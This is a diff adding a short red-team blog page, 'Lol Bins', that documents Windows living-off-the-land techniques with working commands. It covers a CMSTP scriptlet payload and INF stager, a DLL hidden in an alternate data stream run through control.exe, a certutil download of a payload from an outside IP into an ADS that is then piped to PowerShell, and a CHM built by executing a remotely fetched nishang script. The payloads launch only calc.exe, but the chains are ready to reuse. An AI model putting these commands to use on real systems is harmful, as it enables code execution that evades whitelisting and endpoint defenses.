@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Living Off the LandsCMSTP.exe payload cacl.sct  123456789101112&amp;lt;?XML version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;scriptlet&amp;gt;&amp;lt;registration     progid=&amp;quot;PoC&amp;quot;    classid=&amp;quot;&amp;#123;F0001111-0000-00">
+<meta name="keywords" content="Red Team,Windows">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lol Bins">
+<meta property="og:url" content="http://yoursite.com/2018/09/27/Lol-Bins/index.html">
+<meta property="og:site_name" content="kth&#39;s lab">
+<meta property="og:description" content="Living Off the LandsCMSTP.exe payload cacl.sct  123456789101112&amp;lt;?XML version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;scriptlet&amp;gt;&amp;lt;registration     progid=&amp;quot;PoC&amp;quot;    classid=&amp;quot;&amp;#123;F0001111-0000-00">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/Lol-Bins/cmstp2.PNG">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/Lol-Bins/control.PNG">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/Lol-Bins/certutil.PNG">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/Lol-Bins/hh.PNG">
+<meta property="og:updated_time" content="2018-09-27T15:50:04.121Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Lol Bins">
+<meta name="twitter:description" content="Living Off the LandsCMSTP.exe payload cacl.sct  123456789101112&amp;lt;?XML version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;scriptlet&amp;gt;&amp;lt;registration     progid=&amp;quot;PoC&amp;quot;    classid=&amp;quot;&amp;#123;F0001111-0000-00">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/27/Lol-Bins/cmstp2.PNG">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Lol Bins</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">AllIHave</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/09/27/Android-Analysis/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/08/27/Protostar-Stack-Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/09/27/Lol-Bins/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/09/27/Lol-Bins/&text=Lol Bins"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/09/27/Lol-Bins/&title=Lol Bins"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/09/27/Lol-Bins/&is_video=false&description=Lol Bins"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Lol Bins&body=Check out this article: http://yoursite.com/2018/09/27/Lol-Bins/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/09/27/Lol-Bins/&title=Lol Bins"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/09/27/Lol-Bins/&title=Lol Bins"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/09/27/Lol-Bins/&title=Lol Bins"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/09/27/Lol-Bins/&title=Lol Bins"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/09/27/Lol-Bins/&name=Lol Bins&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Living-Off-the-Lands"><span class="toc-number">1.</span> <span class="toc-text">Living Off the Lands</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CMSTP-exe"><span class="toc-number">1.1.</span> <span class="toc-text">CMSTP.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Control-exe"><span class="toc-number">1.2.</span> <span class="toc-text">Control.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CertUtil"><span class="toc-number">1.3.</span> <span class="toc-text">CertUtil</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hh-exe"><span class="toc-number">1.4.</span> <span class="toc-text">hh.exe</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Lol Bins
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">kth's lab</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-09-27T06:06:39.000Z" itemprop="datePublished">2018-09-27</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Red-Team/">Red Team</a>, <a class="tag-link" href="/tags/Windows/">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Living-Off-the-Lands"><a href="#Living-Off-the-Lands" class="headerlink" title="Living Off the Lands"></a>Living Off the Lands</h1><h2 id="CMSTP-exe"><a href="#CMSTP-exe" class="headerlink" title="CMSTP.exe"></a>CMSTP.exe</h2><ul>
+<li>payload cacl.sct</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration </span><br><span class="line">    progid=&quot;PoC&quot;</span><br><span class="line">    classid=&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">	&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">			var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);		</span><br><span class="line">		]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>stager cmstp.inf</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature=$chicago$</span><br><span class="line">AdvancedINF=2.5</span><br><span class="line"></span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs=UnRegisterOCXSection</span><br><span class="line"></span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,C:\\calc.sct</span><br><span class="line"></span><br><span class="line">[Strings]</span><br><span class="line">AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName=&quot;Yay&quot;</span><br><span class="line">ShortSvcName=&quot;Yay&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>run<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe /ni s cmstp.inf</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<img src="/2018/09/27/Lol-Bins/cmstp2.PNG">
+<h2 id="Control-exe"><a href="#Control-exe" class="headerlink" title="Control.exe"></a>Control.exe</h2><ul>
+<li>create dll with msfvenom or custom</li>
+</ul>
+<ul>
+<li>create Alternate Data Stream (ADS)</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\IEUser\Documents&gt;echo &quot;demo&quot; &gt; C:\demo\test.txt</span><br><span class="line"></span><br><span class="line">C:\Users\IEUser\Documents&gt;type calc.dll &gt; C:\demo\test.txt:calc.dll</span><br></pre></td></tr></table></figure>
+<ul>
+<li>execute with control.exe</li>
+</ul>
+<img src="/2018/09/27/Lol-Bins/control.PNG">
+<blockquote>
+<p>reference <br><br><a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-1/" target="_blank" rel="noopener">https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-1/</a></p>
+</blockquote>
+<h2 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h2><ul>
+<li>function of the command <ul>
+<li>download , encode ,decode</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>download payload and write in data stream</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certuil -urlcache -sploit -f http://192.168.1.210/certuil.txt C:\demo\test2.txt:certutil</span><br></pre></td></tr></table></figure>
+<ul>
+<li>payload is simple powershell command</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start-process calc.exe</span><br></pre></td></tr></table></figure>
+<ul>
+<li>execute </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &lt; C:\demo\test2.txt:certuil</span><br></pre></td></tr></table></figure>
+<img src="/2018/09/27/Lol-Bins/certutil.PNG">
+<h2 id="hh-exe"><a href="#hh-exe" class="headerlink" title="hh.exe"></a>hh.exe</h2><ul>
+<li>create help file with the script from nishang</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\IEUser&gt; IEX((iwr &quot;https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1&quot;)</span><br><span class="line"></span><br><span class="line">PS C:\Users\IEUser\Documents&gt; out-chm -Payload &quot;calc&quot; -HHCPath &quot;C:\Program Files (x86)\HTML Help Workshop&quot;</span><br><span class="line">Microsoft HTML Help Compiler 4.74.8702</span><br><span class="line"></span><br><span class="line">Compiling c:\Users\IEUser\Documents\doc.chm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Compile time: 0 minutes, 0 seconds</span><br><span class="line">2       Topics</span><br><span class="line">4       Local links</span><br><span class="line">4       Internet links</span><br><span class="line">0       Graphics</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Created c:\Users\IEUser\Documents\doc.chm, 13,422 bytes</span><br></pre></td></tr></table></figure>
+<ul>
+<li>execute with hh.exe</li>
+</ul>
+<img src="/2018/09/27/Lol-Bins/hh.PNG">
+<blockquote>
+<p>reference <a href="https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/" target="_blank" rel="noopener">https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">AllIHave</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Living-Off-the-Lands"><span class="toc-number">1.</span> <span class="toc-text">Living Off the Lands</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CMSTP-exe"><span class="toc-number">1.1.</span> <span class="toc-text">CMSTP.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Control-exe"><span class="toc-number">1.2.</span> <span class="toc-text">Control.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CertUtil"><span class="toc-number">1.3.</span> <span class="toc-text">CertUtil</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hh-exe"><span class="toc-number">1.4.</span> <span class="toc-text">hh.exe</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/09/27/Lol-Bins/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/09/27/Lol-Bins/&text=Lol Bins"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/09/27/Lol-Bins/&title=Lol Bins"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/09/27/Lol-Bins/&is_video=false&description=Lol Bins"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Lol Bins&body=Check out this article: http://yoursite.com/2018/09/27/Lol-Bins/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/09/27/Lol-Bins/&title=Lol Bins"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/09/27/Lol-Bins/&title=Lol Bins"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/09/27/Lol-Bins/&title=Lol Bins"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/09/27/Lol-Bins/&title=Lol Bins"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/09/27/Lol-Bins/&name=Lol Bins&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Kyaw Thiha
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">AllIHave</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
